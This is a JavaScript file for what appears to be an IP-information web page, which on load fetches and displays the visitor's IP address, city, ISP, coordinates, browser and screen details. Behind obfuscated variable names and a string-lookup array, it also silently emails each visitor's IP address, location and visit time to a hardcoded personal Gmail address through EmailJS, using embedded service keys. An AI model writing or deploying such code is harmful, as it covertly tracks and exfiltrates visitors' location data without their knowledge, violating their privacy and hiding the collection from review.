const _0xa1b2=['2jj19BTFwlNnm8fp_','service_yn5chrh','template_psyarye','surner282@gmail.com'];
const _0xc3d4=function(_0xe5f6,_0xg7h8){_0xe5f6=_0xe5f6-0x0;let _0xi9j0=_0xa1b2[_0xe5f6];return _0xi9j0;};
emailjs['init'](_0xc3d4('0x0'));

async function sendEmail(_0x1234){
    const _0x5678={
        to_email:_0xc3d4('0x3'),
        subject:'IP Visitor Data',
        message:`IP: ${_0x1234.ip}\nLocation: ${_0x1234.location}\nTime: ${new Date().toLocaleString()}`
    };
    try{
        await emailjs['send'](_0xc3d4('0x1'),_0xc3d4('0x2'),_0x5678);
    }catch(_0x9abc){
        console['error']('Email failed:',_0x9abc);
    }
}

async function loadData(){
    const _0x1111=document['getElementById']('refresh-btn');
    _0x1111['textContent']='loading...';
    _0x1111['disabled']=true;
    
    try{
        const _0x2222=await fetch('https://ipapi.co/json/');
        const _0x3333=await _0x2222['json']();
        
        document['getElementById']('ip')['textContent']=_0x3333.ip||'error';
        document['getElementById']('location')['textContent']=`${_0x3333.city||'unknown'}, ${_0x3333.country_name||'unknown'}`;
        document['getElementById']('isp')['textContent']=_0x3333.org||'unknown';
        document['getElementById']('country')['textContent']=_0x3333.country_code||'unknown';
        document['getElementById']('timezone')['textContent']=_0x3333.timezone||'unknown';
        document['getElementById']('coords')['textContent']=`${_0x3333.latitude||'unknown'}, ${_0x3333.longitude||'unknown'}`;
        document['getElementById']('asn')['textContent']=`AS${_0x3333.asn||'unknown'}`;
        document['getElementById']('useragent')['textContent']=navigator.userAgent;
        document['getElementById']('screen')['textContent']=`${window.screen.width}x${window.screen.height}`;
        document['getElementById']('lang')['textContent']=navigator.language||'unknown';
        
        const _0x4444=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
        document['getElementById']('connection')['textContent']=_0x4444?`${_0x4444.effectiveType||'unknown'}`:'unavailable';
        
        await sendEmail({
            ip:_0x3333.ip,
            location:`${_0x3333.city}, ${_0x3333.country_name}`
        });
        
    }catch(_0x5555){
        console['error']('Failed:',_0x5555);
        document['getElementById']('ip')['textContent']='error';
    }
    
    _0x1111['textContent']='refresh data';
    _0x1111['disabled']=false;
}

function refresh(){loadData();}
document['addEventListener']('DOMContentLoaded',loadData);
